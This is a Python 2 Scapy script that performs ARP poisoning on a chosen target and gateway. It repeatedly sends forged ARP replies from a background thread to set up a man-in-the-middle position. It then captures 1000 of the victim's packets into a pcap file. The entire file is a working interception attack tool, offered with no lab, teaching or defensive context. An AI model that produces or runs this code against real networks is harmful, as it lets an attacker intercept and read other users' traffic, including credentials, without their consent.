from scapy.all import *
import sys
import getopt
import threading

opts,args=getopt.getopt(sys.argv[1:],'a',['append','target=','gateway=','interface=','help'])
target_ip='0.0.0.0'
gateway_ip='0.0.0.0'
target_mac='ff:ff:ff:ff:ff:ff'
gateway_mac='ff:ff:ff:ff:ff:ff'
interface='eth0'
append=False
for opt,value in opts:
    if(opt=='--target'):
        target_ip=value
    elif(opt=='--gateway'):
        gateway_ip=value
    elif(opt=='--interface'):
        interface=value
    elif(opt=='-a'):
        append=True
#print target_ip,gateway_ip,interface
conf.iface=interface
conf.verb=0
print "start arp poison"

def main():
    global target_ip,gateway_ip,target_mac,gateway_mac,append
    gateway_mac=getMac(gateway_ip)
    target_mac=getMac(target_ip)
    poison_thread=Poison_Thread()
    poison_thread.start()
    packet_count=1000
    fil="ip host %s" % target_ip
    packets=sniff(count=packet_count,filter=fil,iface=interface)
    #wrpcap('arper.pcap',packets)
    writer=PcapWriter('arper.pcap',append=append)
    for p in packets:
        writer.write(p)
    writer.flush()
    writer.close()
    poison_thread.stop()

def getMac(ip):
    ans,unans=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=2,retry=10)
    for s,r in ans:
        return r[Ether].src

class Poison_Thread(threading.Thread):
    global target_ip,target_mac,gateway_ip,gateway_mac
    def __init__(self):
        super(Poison_Thread,self).__init__()
        self.stopped=False
    def run(self):
        def poison(gateway_ip,gateway_mac,target_ip,target_mac):
            poison_target=ARP()
            poison_target.op=2
            poison_target.psrc=gateway_ip
            poison_target.pdst=target_ip
            poison_target.hwdst=target_mac
            poison_gateway=ARP()
            poison_gateway.op=2
            poison_gateway.psrc=target_ip
            poison_gateway.pdst=gateway_ip
            poison_gateway.hwdst=gateway_mac
            print "sending packets..."
            while not self.stopped:
                send(poison_gateway)
                send(poison_target)
                time.sleep(2)
                print 'send again'
        sub=threading.Thread(target=poison,args=(gateway_ip,gateway_mac,target_ip,target_mac))
        sub.setDaemon(True)
        sub.start()
    def stop(self):
        self.stopped=True


if __name__=='__main__':
    main()
    print "over"
